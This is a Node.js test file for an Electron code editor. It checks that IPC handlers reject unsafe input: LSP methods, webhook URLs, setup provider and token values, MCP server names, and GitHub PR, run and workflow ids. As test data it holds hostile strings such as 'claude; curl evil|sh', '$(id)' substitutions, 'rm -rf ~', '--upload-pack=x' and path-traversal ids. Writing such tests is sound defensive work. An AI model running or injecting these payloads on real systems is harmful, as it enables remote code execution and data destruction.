require('../setup');
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { electronStub } = require('../setup');

// Loads a main/ipc module afresh with a recording ipcMain and returns its handlers.
function handlersOf(modulePath) {
  const handlers = new Map();
  const realHandle = electronStub.ipcMain.handle;
  const resolved = require.resolve(modulePath);
  delete require.cache[resolved];
  electronStub.ipcMain.handle = (ch, fn) => handlers.set(ch, fn);
  try { require(resolved); } finally { electronStub.ipcMain.handle = realHandle; }
  return handlers;
}

test('LSP: only the editor’s own methods reach a language server', async () => {
  const h = handlersOf('../../main/ipc/lsp');
  const refused = (r) => r && /not allowed/.test(r.error || '');
  assert.ok(refused(await h.get('lsp-request')({}, { serverId: 'x', method: 'workspace/executeCommand', params: {} })));
  assert.ok(refused(await h.get('lsp-request')({}, { serverId: 'x', method: 'workspace/applyEdit', params: {} })));
  assert.ok(refused(await h.get('lsp-notify')({}, { serverId: 'x', method: 'workspace/executeCommand', params: {} })));
  assert.ok(refused(await h.get('lsp-request')({}, { serverId: 'x', method: 'textDocument/../workspace', params: {} })));
  assert.ok(refused(await h.get('lsp-request')({}, { serverId: 'x', method: 42 })));
  // Allowed ones get past the check (and fail later on the unknown server id).
  for (const [ch, method] of [['lsp-request', 'textDocument/hover'], ['lsp-request', 'initialize'], ['lsp-notify', 'initialized'], ['lsp-notify', 'workspace/didChangeWatchedFiles']]) {
    const r = await h.get(ch)({}, { serverId: 'no-such-server', method, params: {} }).catch((e) => ({ error: e.message }));
    assert.ok(!refused(r), `${ch} ${method}`);
  }
});

test('webhook URLs: only real Slack and Discord incoming webhooks', () => {
  const { isSlackWebhookUrl, isDiscordWebhookUrl } = require('../../main/util/notification-gateway');
  assert.equal(isSlackWebhookUrl('https://hooks.slack.com/services/T0/B0/xyz'), true);
  assert.equal(isDiscordWebhookUrl('https://discord.com/api/webhooks/1/abc'), true);
  assert.equal(isDiscordWebhookUrl('https://discordapp.com/api/webhooks/1/abc'), true);
  for (const bad of ['http://hooks.slack.com/services/x', 'https://hooks.slack.com.evil.example/services/x',
    'https://hooks.slack.com:8443/services/x', 'http://127.0.0.1:9801/services/x', 'https://evil.example/api/webhooks/1', 'not a url', undefined]) {
    assert.equal(isSlackWebhookUrl(bad), false, String(bad));
    assert.equal(isDiscordWebhookUrl(bad), false, String(bad));
  }
});

test('test-notification refuses a URL that isn’t a Slack or Discord webhook', async () => {
  const h = handlersOf('../../main/ipc/windows-ipc');
  const r = await h.get('test-notification')({}, { slackWebhookUrl: 'http://127.0.0.1:8080/admin' });
  assert.equal(r.ok, false);
  assert.match(r.error, /Slack webhook URL/);
});

test('Nemesis setup: provider and token can’t carry shell code into the script', () => {
  const { nemesisSetupScript, setupInputsOk } = require('../../main/util/nemesis-setup');
  assert.equal(setupInputsOk('claude', 'a1b2c3d4e5f6'), true);
  assert.equal(setupInputsOk('', 'a1b2c3d4e5f6'), true);
  assert.equal(setupInputsOk('claude; curl evil|sh', 'a1b2c3d4e5f6'), false);
  assert.equal(setupInputsOk('claude', 'tok$(id)xyz'), false);
  assert.equal(setupInputsOk('claude', 'short'), false);
  assert.throws(() => nemesisSetupScript('darwin', 'x', '"; rm -rf ~; "'), /Invalid Nemesis8/);
  assert.match(nemesisSetupScript('darwin', 'claude', 'a1b2c3d4e5f6').content, /NEMESIS8_AUTH_TOKEN="a1b2c3d4e5f6"/);
});

test('MCP login: a server name is a plain identifier', async () => {
  const h = handlersOf('../../main/ipc/mcp');
  for (const bad of ['srv & calc', 'srv"|calc', 'a b', 'x'.repeat(101)]) {
    assert.deepEqual(await h.get('mcp-login-terminal')({}, { name: bad }), { error: 'Invalid server name' }, bad);
  }
});

test('creating a project skill needs a workspace the app knows', (t) => {
  const h = handlersOf('../../main/ipc/skills');
  const stranger = fs.mkdtempSync(path.join(os.tmpdir(), 'maussian-stranger-'));
  t.after(() => fs.rmSync(stranger, { recursive: true, force: true }));
  const r = h.get('create-skill-file')({}, { type: 'skill', scope: stranger, name: 'demo' });
  assert.match(r.error, /Invalid project scope/);
  assert.equal(fs.existsSync(path.join(stranger, '.claude')), false);
});

test('LSP lists match exactly what the editor sends', () => {
  const { LSP_REQUESTS, LSP_NOTIFICATIONS } = require('../../main/ipc/lsp');
  const src = fs.readFileSync(path.join(__dirname, '../../renderer/lsp-client.js'), 'utf8');
  const sent = (kind) => new Set([...src.matchAll(new RegExp(`klaus\\.lsp\\.${kind}\\([^,]+,\\s*'([^']+)'`, 'g'))].map((m) => m[1]));
  for (const m of sent('request')) assert.ok(LSP_REQUESTS.has(m), `editor requests ${m}, which lsp.js refuses`);
  for (const m of sent('notify')) assert.ok(LSP_NOTIFICATIONS.has(m), `editor sends ${m}, which lsp.js refuses`);
  assert.ok(sent('request').size >= 5, 'the scan found the editor\u2019s requests');
});

test('gh handlers: PR, comment, run and check ids must be plain numbers', async () => {
  const pr = handlersOf('../../main/ipc/pr-review');
  const wt = os.tmpdir();
  const bad = ['1/../../user', '--help', '1 2', '', 0, -3, '12abc'];
  for (const n of bad) {
    for (const ch of ['pr-merge', 'pr-checks', 'pr-review-threads', 'pr-add-comment', 'pr-add-review-comment']) {
      const r = await pr.get(ch)({}, { worktreePath: wt, prNumber: n, strategy: 'merge', body: 'x' });
      assert.match(r.error, /Invalid pull request number/, `${ch} ${n}`);
    }
    assert.match((await pr.get('pr-reply-to-comment')({}, { worktreePath: wt, prNumber: 1, commentId: n, body: 'x' })).error, /Invalid/);
  }
  assert.match((await pr.get('pr-review')({}, { worktreePath: wt, prNumber: 1, event: 'delete-branch' })).error, /Unknown review event/);
  assert.match((await pr.get('pr-resolve-thread')({}, { worktreePath: wt, threadId: 'x" } ) { evil' })).error, /Invalid thread id/);

  const checks = handlersOf('../../main/ipc/pr-review-checks');
  const { prReview } = require('../../main/state/pr-review');
  const prev = prReview.active;
  prReview.active = { baseOwner: 'o', baseRepo: 'r', forge: 'github', meta: { headRefName: 'feature' } };
  try {
    assert.match((await checks.get('pr-review-run-cancel')({}, { runId: '1;x' })).error, /Invalid run id/);
    assert.match((await checks.get('pr-review-run-rerun-failed')({}, { runId: '--help' })).error, /Invalid run id/);
    assert.match((await checks.get('pr-review-run-log-watch-start')({}, { requestId: 'r1', runId: '../x' })).error, /Invalid run id/);
    assert.match((await checks.get('pr-review-check-annotations')({}, { checkRunId: '1/../../x' })).error, /Invalid check id/);
    const dispatch = (a) => checks.get('pr-review-workflow-dispatch')({}, a);
    assert.match((await dispatch({ workflowId: '../secrets', ref: 'main' })).error, /Invalid workflow id/);
    assert.match((await dispatch({ workflowId: 'ci.yml', ref: '--upload-pack=x' })).error, /Invalid ref/);
    assert.match((await dispatch({ workflowId: 'ci.yml', ref: 'main', inputs: { a: { nested: 1 } } })).error, /Invalid workflow inputs/);
    assert.match((await dispatch({ workflowId: '42', ref: 'main', inputs: { 'bad key': 'x' } })).error, /Invalid workflow inputs/);
  } finally {
    prReview.active = prev;
  }
});

test('Nemesis setup handler and remote steps refuse unsafe provider or token', async (t) => {
  // The handler only sets up a saved profile.
  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
  const before = JSON.parse(JSON.stringify(loadConfig()));
  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
  const cfg = loadConfig();
  cfg.nemesisProfiles = [{ id: 'n8-m', name: 'M', remote: '', token: '', provider: '', model: '' }];
  saveConfig(cfg);
  await flushSaveConfig();
  // tasks.js starts the pre-commit hook's socket server on load, which would
  // keep this test process alive; it isn't what's under test.
  const hook = require('../../main/state/precommit-hook');
  const realStart = hook.startPrecommitServer;
  hook.startPrecommitServer = () => {};
  let tasks;
  try { tasks = handlersOf('../../main/ipc/tasks'); } finally { hook.startPrecommitServer = realStart; }
  const r = await tasks.get('nemesis-setup-local')({}, { profileId: 'n8-m', provider: 'claude; curl evil | sh', token: 'a1b2c3d4e5f6' });
  assert.match(r.error, /plain name/);
  assert.match((await tasks.get('nemesis-setup-local')({}, { profileId: 'n8-m', provider: 'claude', token: 'x$(id)xxxxxx' })).error, /plain name/);
  const { remoteSetupSteps } = require('../../main/ipc/windows-ipc');
  const steps = remoteSetupSteps('darwin', 'claude;rm -rf ~', 'tok$(id)tok').join('\n');
  assert.ok(!steps.includes('rm -rf') && !steps.includes('$(id)'), steps);
  // The steps reach the page, so the saved token is never inlined in them.
  const good = remoteSetupSteps('darwin', 'claude', 'a1b2c3d4e5f6').join('\n');
  assert.match(good, /--provider claude/);
  assert.ok(!good.includes('a1b2c3d4e5f6'), good);
});

test('notifications refuse a non-webhook URL saved in settings, not just on test', async () => {
  const { dispatchEvent } = require('../../main/util/notification-gateway');
  const results = await dispatchEvent(
    { type: require('../../main/util/nemesis-events').EVENT_TYPES.COMPLETED, containerId: 'c', workspacePath: '/w', agentName: 'a', exitCode: 0, logsTail: '', ts: Date.now(), notify: true },
    { slackWebhookUrl: 'http://127.0.0.1:9/hook', discordWebhookUrl: 'http://localhost:9/api/webhooks/1/x', events: { completed: true } },
  );
  assert.equal(results.length, 2);
  for (const r of results) assert.match(r.error, /not a (slack|discord) webhook URL/);
});

test('MCP login: no leading dash, no @ or :', async () => {
  const h = handlersOf('../../main/ipc/mcp');
  for (const bad of ['--help', '-x', 'a@b', 'a:b']) {
    assert.deepEqual(await h.get('mcp-login-terminal')({}, { name: bad }), { error: 'Invalid server name' }, bad);
  }
});
